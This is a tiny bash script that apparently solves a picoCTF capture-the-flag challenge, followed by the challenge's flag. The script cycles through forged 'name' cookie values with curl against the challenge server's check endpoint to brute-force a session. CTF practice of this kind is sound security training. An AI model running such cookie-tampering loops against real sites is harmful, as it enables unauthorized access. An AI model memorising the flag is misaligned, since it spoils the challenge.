#!/bin/bash

for i in {0..28}
do
	curl --cookie "name =$i" "http://mercury.picoctf.net:27177/check"
done


--picoCTF{3v3ry1_l0v3s_c00k135_064663be}
